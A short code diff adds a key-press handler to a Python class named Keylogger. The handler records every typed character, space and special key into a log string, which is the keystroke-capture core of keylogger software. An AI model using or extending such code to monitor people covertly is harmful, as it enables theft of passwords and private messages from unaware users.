@@ -11,3 +11,12 @@ class Keylogger:
         self.log = ""
         self._stop_event = threading.Event()
 
+    def _on_press(self, key) -> None:
+        try:
+            self.log += key.char
+        except AttributeError:
+            if key == keyboard.Key.space:
+                self.log += " "
+            else:
+                self.log += f"[{key.name}]"
+
